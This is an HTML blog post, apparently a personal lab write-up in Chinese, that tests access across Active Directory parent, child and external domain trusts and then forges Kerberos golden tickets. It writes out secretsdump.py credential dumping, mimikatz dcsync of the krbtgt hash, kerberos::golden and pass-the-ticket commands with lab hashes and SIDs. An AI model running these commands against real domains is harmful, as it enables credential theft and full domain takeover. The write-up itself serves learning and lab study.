@@ -1,0 +1,238 @@
+<!DOCTYPE html><html lang="zh-CN" data-theme="light"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0,viewport-fit=cover"><title>域信任访问实践 | caixiaoguan's Blog</title><meta name="author" content="caixiaoguan"><meta name="copyright" content="caixiaoguan"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#ffffff"><meta name="description" content="域信任访问实践父子域双向信任子域机器访问主域的域用户默认策略拒绝登录  访问C$共享资源拒绝访问  可以建立IPC$共享连接  主域机器访问子域的域用户主域机器可以登录子域的域用户  可建立ipc$共享连接，但不能访问C$  主域控访问子域用户仍是普通域用户权限？！  外部域和子域的双向信任子域控可访问IP$，但无权访问C$，权限与外部域的域用户平行  同样外部域中机器可以登录子域的域用户  子域">
+<meta property="og:type" content="article">
+<meta property="og:title" content="域信任访问实践">
+<meta property="og:url" content="http://example.com/2023/07/10/%E5%9F%9F%E4%BF%A1%E4%BB%BB%E8%AE%BF%E9%97%AE%E5%AE%9E%E8%B7%B5/%E5%9F%9F%E4%BF%A1%E4%BB%BB%E8%AE%BF%E9%97%AE%E5%AE%9E%E8%B7%B5/index.html">
+<meta property="og:site_name" content="caixiaoguan&#39;s Blog">
+<meta property="og:description" content="域信任访问实践父子域双向信任子域机器访问主域的域用户默认策略拒绝登录  访问C$共享资源拒绝访问  可以建立IPC$共享连接  主域机器访问子域的域用户主域机器可以登录子域的域用户  可建立ipc$共享连接，但不能访问C$  主域控访问子域用户仍是普通域用户权限？！  外部域和子域的双向信任子域控可访问IP$，但无权访问C$，权限与外部域的域用户平行  同样外部域中机器可以登录子域的域用户  子域">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="http://example.com/img/my.jpg">
+<meta property="article:published_time" content="2023-07-10T06:41:06.000Z">
+<meta property="article:modified_time" content="2025-03-27T12:23:41.546Z">
+<meta property="article:author" content="caixiaoguan">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="http://example.com/img/my.jpg"><link rel="shortcut icon" href="/img/my.jpg"><link rel="canonical" href="http://example.com/2023/07/10/%E5%9F%9F%E4%BF%A1%E4%BB%BB%E8%AE%BF%E9%97%AE%E5%AE%9E%E8%B7%B5/%E5%9F%9F%E4%BF%A1%E4%BB%BB%E8%AE%BF%E9%97%AE%E5%AE%9E%E8%B7%B5/index.html"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="preconnect" href="//busuanzi.ibruce.info"/><link rel="stylesheet" href="/css/index.css?v=4.13.0"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@6.5.1/css/all.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fancyapps/ui@5.0.33/dist/fancybox/fancybox.min.css" media="print" onload="this.media='all'"><script>const GLOBAL_CONFIG = {
+  root: '/',
+  algolia: undefined,
+  localSearch: {"path":"/search.xml","preload":false,"top_n_per_article":1,"unescape":false,"languages":{"hits_empty":"找不到您查询的内容：${query}","hits_stats":"共找到 ${hits} 篇文章"}},
+  translate: undefined,
+  noticeOutdate: undefined,
+  highlight: {"plugin":"highlight.js","highlightCopy":true,"highlightLang":true,"highlightHeightLimit":false},
+  copy: {
+    success: '复制成功',
+    error: '复制错误',
+    noSupport: '浏览器不支持'
+  },
+  relativeDate: {
+    homepage: false,
+    post: false
+  },
+  runtime: '',
+  dateSuffix: {
+    just: '刚刚',
+    min: '分钟前',
+    hour: '小时前',
+    day: '天前',
+    month: '个月前'
+  },
+  copyright: undefined,
+  lightbox: 'fancybox',
+  Snackbar: undefined,
+  infinitegrid: {
+    js: 'https://cdn.jsdelivr.net/npm/@egjs/infinitegrid@4.11.1/dist/infinitegrid.min.js',
+    buttonText: '加载更多'
+  },
+  isPhotoFigcaption: false,
+  islazyload: false,
+  isAnchor: false,
+  percent: {
+    toc: true,
+    rightside: false,
+  },
+  autoDarkmode: false
+}</script><script id="config-diff">var GLOBAL_CONFIG_SITE = {
+  title: '域信任访问实践',
+  isPost: true,
+  isHome: false,
+  isHighlightShrink: false,
+  isToc: true,
+  postUpdate: '2025-03-27 20:23:41'
+}</script><script>(win=>{
+      win.saveToLocal = {
+        set: (key, value, ttl) => {
+          if (ttl === 0) return
+          const now = Date.now()
+          const expiry = now + ttl * 86400000
+          const item = {
+            value,
+            expiry
+          }
+          localStorage.setItem(key, JSON.stringify(item))
+        },
+      
+        get: key => {
+          const itemStr = localStorage.getItem(key)
+      
+          if (!itemStr) {
+            return undefined
+          }
+          const item = JSON.parse(itemStr)
+          const now = Date.now()
+      
+          if (now > item.expiry) {
+            localStorage.removeItem(key)
+            return undefined
+          }
+          return item.value
+        }
+      }
+    
+      win.getScript = (url, attr = {}) => new Promise((resolve, reject) => {
+        const script = document.createElement('script')
+        script.src = url
+        script.async = true
+        script.onerror = reject
+        script.onload = script.onreadystatechange = function() {
+          const loadState = this.readyState
+          if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
+          script.onload = script.onreadystatechange = null
+          resolve()
+        }
+
+        Object.keys(attr).forEach(key => {
+          script.setAttribute(key, attr[key])
+        })
+
+        document.head.appendChild(script)
+      })
+    
+      win.getCSS = (url, id = false) => new Promise((resolve, reject) => {
+        const link = document.createElement('link')
+        link.rel = 'stylesheet'
+        link.href = url
+        if (id) link.id = id
+        link.onerror = reject
+        link.onload = link.onreadystatechange = function() {
+          const loadState = this.readyState
+          if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
+          link.onload = link.onreadystatechange = null
+          resolve()
+        }
+        document.head.appendChild(link)
+      })
+    
+      win.activateDarkMode = () => {
+        document.documentElement.setAttribute('data-theme', 'dark')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#0d0d0d')
+        }
+      }
+      win.activateLightMode = () => {
+        document.documentElement.setAttribute('data-theme', 'light')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#ffffff')
+        }
+      }
+      const t = saveToLocal.get('theme')
+    
+        if (t === 'dark') activateDarkMode()
+        else if (t === 'light') activateLightMode()
+      
+      const asideStatus = saveToLocal.get('aside-status')
+      if (asideStatus !== undefined) {
+        if (asideStatus === 'hide') {
+          document.documentElement.classList.add('hide-aside')
+        } else {
+          document.documentElement.classList.remove('hide-aside')
+        }
+      }
+    
+      const detectApple = () => {
+        if(/iPad|iPhone|iPod|Macintosh/.test(navigator.userAgent)){
+          document.documentElement.classList.add('apple')
+        }
+      }
+      detectApple()
+    })(window)</script><meta name="generator" content="Hexo 7.3.0"></head><body><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="avatar-img is-center"><img src="/img/my.jpg" onerror="onerror=null;src='/img/friend_404.gif'" alt="avatar"/></div><div class="sidebar-site-data site-data is-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">8</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">0</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">0</div></a></div><hr class="custom-hr"/></div></div><div class="post" id="body-wrap"><header class="post-bg" id="page-header"><nav id="nav"><span id="blog-info"><a href="/" title="caixiaoguan's Blog"><span class="site-name">caixiaoguan's Blog</span></a></span><div id="menus"><div id="search-button"><a class="site-page social-icon search" href="javascript:void(0);"><i class="fas fa-search fa-fw"></i><span> 搜索</span></a></div><div id="toggle-menu"><a class="site-page" href="javascript:void(0);"><i class="fas fa-bars fa-fw"></i></a></div></div></nav><div id="post-info"><h1 class="post-title">域信任访问实践</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="far fa-calendar-alt fa-fw post-meta-icon"></i><span class="post-meta-label">发表于</span><time class="post-meta-date-created" datetime="2023-07-10T06:41:06.000Z" title="发表于 2023-07-10 14:41:06">2023-07-10</time><span class="post-meta-separator">|</span><i class="fas fa-history fa-fw post-meta-icon"></i><span class="post-meta-label">更新于</span><time class="post-meta-date-updated" datetime="2025-03-27T12:23:41.546Z" title="更新于 2025-03-27 20:23:41">2025-03-27</time></span></div><div class="meta-secondline"></div></div></div></header><main class="layout" id="content-inner"><div id="post"><article class="post-content" id="article-container"><h1 id="域信任访问实践"><a href="#域信任访问实践" class="headerlink" title="域信任访问实践"></a>域信任访问实践</h1><h2 id="父子域双向信任"><a href="#父子域双向信任" class="headerlink" title="父子域双向信任"></a>父子域双向信任</h2><h3 id="子域机器访问主域的域用户"><a href="#子域机器访问主域的域用户" class="headerlink" title="子域机器访问主域的域用户"></a>子域机器访问主域的域用户</h3><p>默认策略拒绝登录</p>
+<p><img src="/2023/07/10/%E5%9F%9F%E4%BF%A1%E4%BB%BB%E8%AE%BF%E9%97%AE%E5%AE%9E%E8%B7%B5/%E5%9F%9F%E4%BF%A1%E4%BB%BB%E8%AE%BF%E9%97%AE%E5%AE%9E%E8%B7%B5/1688451222909-22aeff4d-2958-4e73-b42a-e039aa99106f.png"></p>
+<p>访问C$共享资源拒绝访问</p>
+<p><img src="/2023/07/10/%E5%9F%9F%E4%BF%A1%E4%BB%BB%E8%AE%BF%E9%97%AE%E5%AE%9E%E8%B7%B5/%E5%9F%9F%E4%BF%A1%E4%BB%BB%E8%AE%BF%E9%97%AE%E5%AE%9E%E8%B7%B5/1688456517811-efb3b6e3-5a78-4365-85a8-742bed494c68.png"></p>
+<p>可以建立IPC$共享连接</p>
+<p><img src="/2023/07/10/%E5%9F%9F%E4%BF%A1%E4%BB%BB%E8%AE%BF%E9%97%AE%E5%AE%9E%E8%B7%B5/%E5%9F%9F%E4%BF%A1%E4%BB%BB%E8%AE%BF%E9%97%AE%E5%AE%9E%E8%B7%B5/1688456592869-6578e834-0617-4c39-a1a7-649af5b5655e.png"></p>
+<h3 id="主域机器访问子域的域用户"><a href="#主域机器访问子域的域用户" class="headerlink" title="主域机器访问子域的域用户"></a>主域机器访问子域的域用户</h3><p>主域机器可以登录子域的域用户</p>
+<p><img src="/2023/07/10/%E5%9F%9F%E4%BF%A1%E4%BB%BB%E8%AE%BF%E9%97%AE%E5%AE%9E%E8%B7%B5/%E5%9F%9F%E4%BF%A1%E4%BB%BB%E8%AE%BF%E9%97%AE%E5%AE%9E%E8%B7%B5/1688457034483-bee739fe-4832-4b63-ba22-2cba6318bedd.png"></p>
+<p>可建立ipc$共享连接，但不能访问C$</p>
+<p><img src="/2023/07/10/%E5%9F%9F%E4%BF%A1%E4%BB%BB%E8%AE%BF%E9%97%AE%E5%AE%9E%E8%B7%B5/%E5%9F%9F%E4%BF%A1%E4%BB%BB%E8%AE%BF%E9%97%AE%E5%AE%9E%E8%B7%B5/1688460929043-7f2f6609-91c3-484c-ac0d-927caf23aa33.png"></p>
+<h3 id="主域控访问子域用户"><a href="#主域控访问子域用户" class="headerlink" title="主域控访问子域用户"></a>主域控访问子域用户</h3><p>仍是普通域用户权限？！</p>
+<p><img src="/2023/07/10/%E5%9F%9F%E4%BF%A1%E4%BB%BB%E8%AE%BF%E9%97%AE%E5%AE%9E%E8%B7%B5/%E5%9F%9F%E4%BF%A1%E4%BB%BB%E8%AE%BF%E9%97%AE%E5%AE%9E%E8%B7%B5/1688461100878-1e32b13c-ad11-46c3-af09-de13f03961a2.png"></p>
+<h2 id="外部域和子域的双向信任"><a href="#外部域和子域的双向信任" class="headerlink" title="外部域和子域的双向信任"></a>外部域和子域的双向信任</h2><p>子域控可访问IP$，但无权访问C$，权限与外部域的域用户平行</p>
+<p><img src="/2023/07/10/%E5%9F%9F%E4%BF%A1%E4%BB%BB%E8%AE%BF%E9%97%AE%E5%AE%9E%E8%B7%B5/%E5%9F%9F%E4%BF%A1%E4%BB%BB%E8%AE%BF%E9%97%AE%E5%AE%9E%E8%B7%B5/1688464797130-11c5bfa7-16c4-475a-bcf7-a3d0401cd9ee.png"></p>
+<p>同样外部域中机器可以登录子域的域用户</p>
+<p><img src="/2023/07/10/%E5%9F%9F%E4%BF%A1%E4%BB%BB%E8%AE%BF%E9%97%AE%E5%AE%9E%E8%B7%B5/%E5%9F%9F%E4%BF%A1%E4%BB%BB%E8%AE%BF%E9%97%AE%E5%AE%9E%E8%B7%B5/1688471859245-bde3b404-d684-4de6-81b0-b80165c831b0.png"></p>
+<h2 id="子域和子域的信任"><a href="#子域和子域的信任" class="headerlink" title="子域和子域的信任"></a>子域和子域的信任</h2><p>平行关系</p>
+<p><img src="/2023/07/10/%E5%9F%9F%E4%BF%A1%E4%BB%BB%E8%AE%BF%E9%97%AE%E5%AE%9E%E8%B7%B5/%E5%9F%9F%E4%BF%A1%E4%BB%BB%E8%AE%BF%E9%97%AE%E5%AE%9E%E8%B7%B5/1688473373108-353402ed-a8d3-4d0b-9745-456e7f6592c6.png"></p>
+<h2 id="使用命令与问题记录"><a href="#使用命令与问题记录" class="headerlink" title="使用命令与问题记录"></a>使用命令与问题记录</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">检测是否有权限访问：</span><br><span class="line">net use \\ip或fqdn名\ipc$</span><br><span class="line">检测权限：</span><br><span class="line">dir \\ip或fqdn名\c$</span><br><span class="line"></span><br><span class="line">前提：</span><br><span class="line">目标共享主机上线，并开放相应的smb服务</span><br><span class="line">同时域控在线处理登录请求</span><br><span class="line">确保连接双方没有脱机，走的是正常域网络</span><br><span class="line"></span><br><span class="line">扩展：</span><br><span class="line">net use &lt;驱动器&gt;: \\服务器\共享路径 [密码] /user:用户名</span><br><span class="line"></span><br><span class="line">net use z: 是一个用于在 Windows 操作系统上映射网络驱动器（Network Drive）的命令。通过该命令，可以将共享文件夹或网络资源映射为本地计算机上的一个驱动器z。</span><br></pre></td></tr></table></figure>
+
+
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">防火墙没开放smb（文件或打印机共享服务）导致net use命令无效报错</span><br><span class="line">在域控未在线的情况下无法使用net use 命令</span><br></pre></td></tr></table></figure>
+
+
+
+<h1 id="krbtgt黄金票据伪造"><a href="#krbtgt黄金票据伪造" class="headerlink" title="krbtgt黄金票据伪造"></a>krbtgt黄金票据伪造</h1><p>远程：proxychain3+stowayway+psexec.py</p>
+<p>初始访问拒绝</p>
+<p><img src="/2023/07/10/%E5%9F%9F%E4%BF%A1%E4%BB%BB%E8%AE%BF%E9%97%AE%E5%AE%9E%E8%B7%B5/%E5%9F%9F%E4%BF%A1%E4%BB%BB%E8%AE%BF%E9%97%AE%E5%AE%9E%E8%B7%B5/1689065667216-97819583-a5e0-4cf9-a2e5-47a9090326c9.png"></p>
+<h2 id="获取krbtgt的NTLM-hash"><a href="#获取krbtgt的NTLM-hash" class="headerlink" title="获取krbtgt的NTLM hash"></a>获取krbtgt的NTLM hash</h2><p>获取krbtgt的NTLM hash （前提拿下域控知道域控的账号密码）</p>
+<p>再socks5代理下，使用impacket的secretsdump.py脚本导出所有用户hash</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">proxychains3 python3 secretsdump.py GUAN/administrator:Guandaye@10.10.10.60 </span><br></pre></td></tr></table></figure>
+
+<p><img src="/2023/07/10/%E5%9F%9F%E4%BF%A1%E4%BB%BB%E8%AE%BF%E9%97%AE%E5%AE%9E%E8%B7%B5/%E5%9F%9F%E4%BF%A1%E4%BB%BB%E8%AE%BF%E9%97%AE%E5%AE%9E%E8%B7%B5/1688962830945-35069b2b-14e7-41f1-960d-c906675c5ef9.png"></p>
+<h2 id="获取域sid"><a href="#获取域sid" class="headerlink" title="获取域sid"></a>获取域sid</h2><p>在控制的域机器获取域sid，获取交互式命令，执行命令whoami &#x2F;all</p>
+<p><img src="/2023/07/10/%E5%9F%9F%E4%BF%A1%E4%BB%BB%E8%AE%BF%E9%97%AE%E5%AE%9E%E8%B7%B5/%E5%9F%9F%E4%BF%A1%E4%BB%BB%E8%AE%BF%E9%97%AE%E5%AE%9E%E8%B7%B5/1688963207554-4d2745b8-bbd8-43b4-8978-a383528c7005.png"></p>
+<h2 id="制作黄金票据"><a href="#制作黄金票据" class="headerlink" title="制作黄金票据"></a>制作黄金票据</h2><p><img src="/2023/07/10/%E5%9F%9F%E4%BF%A1%E4%BB%BB%E8%AE%BF%E9%97%AE%E5%AE%9E%E8%B7%B5/%E5%9F%9F%E4%BF%A1%E4%BB%BB%E8%AE%BF%E9%97%AE%E5%AE%9E%E8%B7%B5/1689066006297-12de866f-2fdb-42b0-9b37-a22cad61b625.png"></p>
+<h2 id="清除当前缓存的票据"><a href="#清除当前缓存的票据" class="headerlink" title="清除当前缓存的票据"></a>清除当前缓存的票据</h2><p><img src="/2023/07/10/%E5%9F%9F%E4%BF%A1%E4%BB%BB%E8%AE%BF%E9%97%AE%E5%AE%9E%E8%B7%B5/%E5%9F%9F%E4%BF%A1%E4%BB%BB%E8%AE%BF%E9%97%AE%E5%AE%9E%E8%B7%B5/1689066054826-566856fe-5ef6-4d0f-b4e3-5b5303e7c890.png"></p>
+<h2 id="运行mimikatz将票据加进内存"><a href="#运行mimikatz将票据加进内存" class="headerlink" title="运行mimikatz将票据加进内存"></a>运行mimikatz将票据加进内存</h2><p><img src="/2023/07/10/%E5%9F%9F%E4%BF%A1%E4%BB%BB%E8%AE%BF%E9%97%AE%E5%AE%9E%E8%B7%B5/%E5%9F%9F%E4%BF%A1%E4%BB%BB%E8%AE%BF%E9%97%AE%E5%AE%9E%E8%B7%B5/1688964413231-f067dd8a-7416-49e7-b96f-1f21c68042da.png"></p>
+<h2 id="验证结果"><a href="#验证结果" class="headerlink" title="验证结果"></a>验证结果</h2><p>运行命令查看是否能访问域控c盘</p>
+<p><img src="/2023/07/10/%E5%9F%9F%E4%BF%A1%E4%BB%BB%E8%AE%BF%E9%97%AE%E5%AE%9E%E8%B7%B5/%E5%9F%9F%E4%BF%A1%E4%BB%BB%E8%AE%BF%E9%97%AE%E5%AE%9E%E8%B7%B5/1688964349424-d06f640a-1266-4813-ab4c-9393931c497a.png"></p>
+<h2 id="使用到的命令和问题记录"><a href="#使用到的命令和问题记录" class="headerlink" title="使用到的命令和问题记录"></a>使用到的命令和问题记录</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">mimikatz获取krbtgt的NTLM hash：</span><br><span class="line">mimikatz.exe &quot;lsadump::dcsync /domain:guan.com /user:krbtgt&quot; &quot;exit&quot; &gt; krbtgt.txt</span><br><span class="line"></span><br><span class="line">获取域sid：</span><br><span class="line">whoami /all</span><br><span class="line"></span><br><span class="line">制作票据：</span><br><span class="line">mimikatz.exe &quot;kerberos::golden /admin:administrator /domain:guan.com /sid:S-1-5-21-3508285758-1297247212-4289168691 /krbtgt:289818b691124b841d8efffb8d8b5906 /ticket:ticket.kirbi&quot; exit</span><br><span class="line"></span><br><span class="line">mimikatz导入票据进内存：</span><br><span class="line">mimikatz.exe &quot;kerberos::ptt ticket.kirbi&quot; &quot;exit&quot;</span><br><span class="line"></span><br><span class="line">票据操作</span><br><span class="line">列出当前计算机的所有票据：</span><br><span class="line">klist</span><br><span class="line"></span><br><span class="line">删除指定票据：</span><br><span class="line">klist purge &lt;TicketName&gt;</span><br><span class="line">mimikatz.exe &quot;kerberos::purge&quot; &quot;exit&quot;</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">验证票据时需要管理员下运行cmd,否则会拒绝访问</span><br></pre></td></tr></table></figure>
+
+<h1 id="krbtgt注入跨域尝试"><a href="#krbtgt注入跨域尝试" class="headerlink" title="krbtgt注入跨域尝试"></a>krbtgt注入跨域尝试<font style="background-color:#74B602;"></font></h1><p><font style="background-color:#FBDE28;">备：该部分只是尝试，操作与上边远控下的黄金票据注入一模一样，所以在本地直接测试</font></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">主域krbtgt:c428ce5ee02ce1e17fbdd5101cde2f6b</span><br><span class="line">主域sid:S-1-5-21-2345497531-1760483928-829117376</span><br><span class="line"></span><br><span class="line">子域krbtgt:0b9071ecab5fb23e59a438415c89bd0b</span><br><span class="line">子域sid:S-1-5-21-2348784605-2959612175-4116092977</span><br></pre></td></tr></table></figure>
+
+<h2 id="主域用户注入子域控的krbtgt"><a href="#主域用户注入子域控的krbtgt" class="headerlink" title="主域用户注入子域控的krbtgt"></a>主域用户注入子域控的krbtgt</h2><h3 id="主域用户-子域krbtgt-主域sid-子域名"><a href="#主域用户-子域krbtgt-主域sid-子域名" class="headerlink" title="主域用户+子域krbtgt+主域sid+子域名"></a>主域用户+子域krbtgt+主域sid+子域名</h3><p>注入：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mimikatz.exe &quot;kerberos::golden /admin:administrator /domain:sondc1.hack-guan.com /sid:S-1-5-21-2345497531-1760483928-829117376 /krbtgt:0b9071ecab5fb23e59a438415c89bd0b /ticket:ticket.kirbi&quot; exit</span><br></pre></td></tr></table></figure>
+
+
+
+<p>访问主域控：成功</p>
+<p><img src="/2023/07/10/%E5%9F%9F%E4%BF%A1%E4%BB%BB%E8%AE%BF%E9%97%AE%E5%AE%9E%E8%B7%B5/%E5%9F%9F%E4%BF%A1%E4%BB%BB%E8%AE%BF%E9%97%AE%E5%AE%9E%E8%B7%B5/1688913373810-da9779a4-4cee-4f39-a28a-5eaba6b49b97.png"></p>
+<p>访问子域控：成功</p>
+<p><img src="/2023/07/10/%E5%9F%9F%E4%BF%A1%E4%BB%BB%E8%AE%BF%E9%97%AE%E5%AE%9E%E8%B7%B5/%E5%9F%9F%E4%BF%A1%E4%BB%BB%E8%AE%BF%E9%97%AE%E5%AE%9E%E8%B7%B5/1688913475334-f821ebdf-5744-4363-99dc-143583e8d9bc.png"></p>
+<p>访问子域用户：拒绝（应该是sid的缘故）</p>
+<p><img src="/2023/07/10/%E5%9F%9F%E4%BF%A1%E4%BB%BB%E8%AE%BF%E9%97%AE%E5%AE%9E%E8%B7%B5/%E5%9F%9F%E4%BF%A1%E4%BB%BB%E8%AE%BF%E9%97%AE%E5%AE%9E%E8%B7%B5/1688913555991-9a5d5b86-9c33-42c7-b599-09293e52c582.png"></p>
+<h3 id="主域用户-子域krbtgt-子域sid-子域名"><a href="#主域用户-子域krbtgt-子域sid-子域名" class="headerlink" title="主域用户+子域krbtgt+子域sid+子域名"></a>主域用户+子域krbtgt+子域sid+子域名</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mimikatz.exe &quot;kerberos::golden /admin:administrator /domain:sondc1.hack-guan.com /sid:S-1-5-21-2348784605-2959612175-4116092977 /krbtgt:0b9071ecab5fb23e59a438415c89bd0b /ticket:ticket.kirbi&quot; exit</span><br></pre></td></tr></table></figure>
+
+<p>访问主域控：拒绝</p>
+<p><img src="/2023/07/10/%E5%9F%9F%E4%BF%A1%E4%BB%BB%E8%AE%BF%E9%97%AE%E5%AE%9E%E8%B7%B5/%E5%9F%9F%E4%BF%A1%E4%BB%BB%E8%AE%BF%E9%97%AE%E5%AE%9E%E8%B7%B5/1688914104729-6fd396ab-3e88-4e6a-8700-33bbaf7501f7.png"></p>
+<p>访问子域域控：成功</p>
+<p><img src="/2023/07/10/%E5%9F%9F%E4%BF%A1%E4%BB%BB%E8%AE%BF%E9%97%AE%E5%AE%9E%E8%B7%B5/%E5%9F%9F%E4%BF%A1%E4%BB%BB%E8%AE%BF%E9%97%AE%E5%AE%9E%E8%B7%B5/1688914125083-5baa3156-ee24-43c1-8efa-ed85fc1315c1.png"></p>
+<p>访问子域用户：成功</p>
+<p><img src="/2023/07/10/%E5%9F%9F%E4%BF%A1%E4%BB%BB%E8%AE%BF%E9%97%AE%E5%AE%9E%E8%B7%B5/%E5%9F%9F%E4%BF%A1%E4%BB%BB%E8%AE%BF%E9%97%AE%E5%AE%9E%E8%B7%B5/1688914149663-c0e4a680-7b98-48c8-b875-307dee4a16f9.png"></p>
+<h2 id="子域用户注入主域控的krbtgt"><a href="#子域用户注入主域控的krbtgt" class="headerlink" title="子域用户注入主域控的krbtgt"></a>子域用户注入主域控的krbtgt</h2><h3 id="子域用户-主域krbtgt-主域sid-主域名"><a href="#子域用户-主域krbtgt-主域sid-主域名" class="headerlink" title="子域用户+主域krbtgt+主域sid+主域名"></a>子域用户+主域krbtgt+主域sid+主域名</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">mimikatz.exe &quot;kerberos::golden /admin:administrator /domain:hack-guan.com /sid:S-1-5-21-2345497531-1760483928-829117376 /krbtgt:c428ce5ee02ce1e17fbdd5101cde2f6b /ticket:ticket.kirbi&quot; exit</span><br><span class="line"></span><br><span class="line">mimikatz.exe &quot;kerberos::ptt ticket.kirbi&quot;</span><br></pre></td></tr></table></figure>
+
+<p>访问主域控：成功</p>
+<p><img src="/2023/07/10/%E5%9F%9F%E4%BF%A1%E4%BB%BB%E8%AE%BF%E9%97%AE%E5%AE%9E%E8%B7%B5/%E5%9F%9F%E4%BF%A1%E4%BB%BB%E8%AE%BF%E9%97%AE%E5%AE%9E%E8%B7%B5/1688914896754-7ca8c535-7710-44d5-ad59-18cdf41ce92b.png"></p>
+<p>访问子域控：成功</p>
+<p><img src="/2023/07/10/%E5%9F%9F%E4%BF%A1%E4%BB%BB%E8%AE%BF%E9%97%AE%E5%AE%9E%E8%B7%B5/%E5%9F%9F%E4%BF%A1%E4%BB%BB%E8%AE%BF%E9%97%AE%E5%AE%9E%E8%B7%B5/1688914918673-8439361d-296b-421e-9908-9b5238ccb68c.png"></p>
+<p>访问主域用户：成功</p>
+<p><img src="/2023/07/10/%E5%9F%9F%E4%BF%A1%E4%BB%BB%E8%AE%BF%E9%97%AE%E5%AE%9E%E8%B7%B5/%E5%9F%9F%E4%BF%A1%E4%BB%BB%E8%AE%BF%E9%97%AE%E5%AE%9E%E8%B7%B5/1688914948285-cb081f6e-9313-4994-a903-1910fd0a937b.png"></p>
+<p>访问子域其它用户（拒绝，sid缘故）</p>
+<h3 id="子域用户-主域krbtgt-子域sid-主域名"><a href="#子域用户-主域krbtgt-子域sid-主域名" class="headerlink" title="子域用户+主域krbtgt+子域sid+主域名"></a>子域用户+主域krbtgt+子域sid+主域名</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">mimikatz.exe &quot;kerberos::golden /admin:administrator /domain:hack-guan.com /sid:S-1-5-21-2348784605-2959612175-4116092977 /krbtgt:c428ce5ee02ce1e17fbdd5101cde2f6b /ticket:ticket.kirbi&quot; exit</span><br><span class="line"></span><br><span class="line">mimikatz.exe &quot;kerberos::ptt ticket.kirbi&quot;</span><br></pre></td></tr></table></figure>
+
+<p>只能访问子域域控</p>
+<p><img src="/2023/07/10/%E5%9F%9F%E4%BF%A1%E4%BB%BB%E8%AE%BF%E9%97%AE%E5%AE%9E%E8%B7%B5/%E5%9F%9F%E4%BF%A1%E4%BB%BB%E8%AE%BF%E9%97%AE%E5%AE%9E%E8%B7%B5/1688915424452-74edc4d9-7e40-4bb9-967b-af4b5597ba02.png"></p>
+<p>访问子域用户</p>
+<p><img src="/2023/07/10/%E5%9F%9F%E4%BF%A1%E4%BB%BB%E8%AE%BF%E9%97%AE%E5%AE%9E%E8%B7%B5/%E5%9F%9F%E4%BF%A1%E4%BB%BB%E8%AE%BF%E9%97%AE%E5%AE%9E%E8%B7%B5/1689040712266-ad42aa80-cd9a-498e-aa27-9d4297568e08.png"></p>
+<h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><p>不同信任关系的登录与ipc尝试效果不同，主域在访问子域时也并非完全控制，同时通过尝试发现，只要我们拿下子域控等同于拿下主域控，因为我们可以凭据子域控的krbtgt和主域的sid来访问主域控C盘资源，即只要拥有对应的sid和krbtgt，整个环境的资源我们都可以为所欲为的使用。</p>
